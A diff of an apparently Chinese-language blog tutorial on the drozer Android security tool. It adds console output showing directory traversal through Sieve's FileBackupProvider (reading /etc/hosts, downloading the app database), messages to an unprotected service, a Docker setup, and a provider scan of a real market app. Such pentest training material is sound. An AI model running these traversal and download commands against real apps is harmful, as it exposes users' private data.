@@ -11,9 +11,14 @@ categories:
     - android安全
     - drozer
 description: drozer配置&使用
+top: 10
+password: teanb
+abstract: 这里有东西被加密了，需要输入密码查看哦。
+message: 您好，这里需要密码。
+wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。
+wrong_hash_message: 抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。
 abbrlink: 525637870
 date: 2020-11-01 09:13:02
-top: 10
 ---
 
 # android_drozer
@@ -351,14 +356,12 @@ Not Vulnerable:
   content://com.mwr.example.sieve.DBContentProvider/Keys
   content://com.mwr.example.sieve.DBContentProvider/Passwords/
   content://com.mwr.example.sieve.DBContentProvider/Keys/
-  content://com.mwr.example.sieve.FileBackupProvider
-  content://com.mwr.example.sieve.FileBackupProvider/
   content://com.mwr.example.sieve.DBContentProvider/Passwords
   content://com.mwr.example.sieve.DBContentProvider
 
 Vulnerable Providers:
-  No vulnerable providers found.
-dz> 
+  content://com.mwr.example.sieve.FileBackupProvider/
+  content://com.mwr.example.sieve.FileBackupProvider
 ```
 手动测试目录遍历漏洞：
 读取指定路径文件内容：
@@ -366,12 +369,23 @@ run app.provider.read contentProviderURI+filePath
 
 
 run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+```
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+127.0.0.1       localhost
+::1             ip6-localhos
+```
+
+--- 
 
 下载安装包目录下指定目录下的文件：run app.provider.download contentProviderURI+filePath exportPath
 
 run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /Users/tea/Downloads/databse.db
 
-run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .
+任意下载文件
+```
+dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .
+Written 24576 bytes
+```
 
 
 获取service信息
@@ -385,10 +399,20 @@ Package: com.mwr.example.sieve
   com.mwr.example.sieve.CryptoService
     Permission: null
 ```
+
 向服务发送消息
 run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3
 
 run app.service.send com.example.srv com.example.srv.Service --msg 1 2 3 --extra float value 0.1324 --extra string test value
+
+```
+dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3
+Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:
+  what: 111111
+  arg1: 0
+  arg2: 0
+  Empty
+```
 
 
 关于service模块
@@ -625,6 +649,7 @@ class Deny(Module, common.Filters, common.PackageManager):
 
 创建自己的moudle仓库
 module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea
+把fuzz.py放到目录里
 安装模块
 module install /Users/tea/Documents/tools/android/drozer-modules-bytea/fuzz.py
 
@@ -795,7 +820,7 @@ Traceback (most recent call last):
     raise RuntimeError("drozer could not find or compile a required extension library.\n")
 RuntimeError: drozer could not find or compile a required extension library.
 ```
-修改 /Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py
+修改 `/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py`
 
 ```
  def __get_source(self, source_or_relative_path, relative_to=None):
@@ -816,6 +841,106 @@ RuntimeError: drozer could not find or compile a required extension library.
 ```
 https://github.com/FSecureLABS/drozer/issues/361
 
+## drozer docker
+https://github.com/FSecureLABS/drozer/tree/develop/docker
+```
+手机drozer Server打开Enabled
+adb forward tcp:31415 tcp:31415  
+
+拉取镜像
+docker pull fsecurelabs/drozer
+启动 这样运行每次都会启动一个docker镜像
+docker run -it fsecurelabs/drozer 
+推荐后台启动
+docker run -d -it fsecurelabs/drozer 
+docker exec -it <container-id> /bin/bash
+查询
+docker ps -a
+重启容器
+docker restart 7182d7c77df1  
+
+root@583ffdf5a998:/# drozer console connect --server 192.168.1.210
+Selecting 038941488d55f461 (Google Pixel XL 8.1.0)
+
+            ..                    ..:.
+           ..o..                  .r..
+            ..a..  . ....... .  ..nd
+              ro..idsnemesisand..pr
+              .otectorandroidsneme.
+           .,sisandprotectorandroids+.
+         ..nemesisandprotectorandroidsn:.
+        .emesisandprotectorandroidsnemes..
+      ..isandp,..,rotectorandro,..,idsnem.
+      .isisandp..rotectorandroid..snemisis.
+      ,andprotectorandroidsnemisisandprotec.
+     .torandroidsnemesisandprotectorandroid.
+     .snemisisandprotectorandroidsnemesisan:
+     .dprotectorandroidsnemesisandprotector.
+
+drozer Console (v2.4.4)
+dz> run scanner.provider.finduris -a com.coolapk.market
+Scanning com.coolapk.market...
+Unable to Query  content://com.coolapk.market.fileprovider/
+Unable to Query  content://downloads/public_downloads
+Unable to Query  content://com.coolapk.market.TTMultiProvider/
+Unable to Query  content://com.coolapk.market.fileprovider
+Unable to Query  content://com.coolapk.market.TTMultiProvider
+Unable to Query  content://com.coolapk.market.zbar.FileProvider
+Unable to Query  content://com.coolapk.market.TENCENT.MID.V4/
+Unable to Query  content://com.coolapk.market.TENCENT.MID.V4
+Unable to Query  content://telephony/carriers/preferapn/
+Unable to Query  content://com.coolapk.market.zbar.FileProvider/
+Unable to Query  content://com.coolapk.market.TTFileProvider
+Unable to Query  content://com.coolapk.market.TTFileProvider/
+Unable to Query  content://downloads/public_downloads/
+Unable to Query  content://com.coolapk.market.utilcode.provider
+Unable to Query  content://telephony/carriers/preferapn
+Unable to Query  content://com.coolapk.market.utilcode.provider/
+
+No accessible content URIs found.
+dz>
+```
+
+```
+git clone https://github.com/FSecureLABS/drozer-modules.git
+
+root@6842e8e0c7b0:/# drozer console connect --server 192.168.11.217
+Selecting 29381b23433115c3 (Google Pixel 8.1.0)
+
+            ..                    ..:.
+           ..o..                  .r..
+            ..a..  . ....... .  ..nd
+              ro..idsnemesisand..pr
+              .otectorandroidsneme.
+           .,sisandprotectorandroids+.
+         ..nemesisandprotectorandroidsn:.
+        .emesisandprotectorandroidsnemes..
+      ..isandp,..,rotectorandro,..,idsnem.
+      .isisandp..rotectorandroid..snemisis.
+      ,andprotectorandroidsnemisisandprotec.
+     .torandroidsnemesisandprotectorandroid.
+     .snemisisandprotectorandroidsnemesisan:
+     .dprotectorandroidsnemesisandprotector.
+
+drozer Console (v2.4.4)
+dz> module repository create /drozer-modules
+The target (/drozer-modules) already exists.
+
+dz> module install /drozer-modules/intents/fuzzinozer.py
+You do not have a drozer Module Repository.
+Would you like to create one? [yn] y
+Path to new repository: /drozer-modules
+The target (/drozer-modules) already exists.
+
+Path to new repository: /drozer-modules1
+Initialised repository at /drozer-modules1.
+
+Processing /drozer-modules/intents/fuzzinozer.py... Done.
+
+Successfully installed 1 modules, 0 already installed.
+
+dz> 
+```
 
 
 
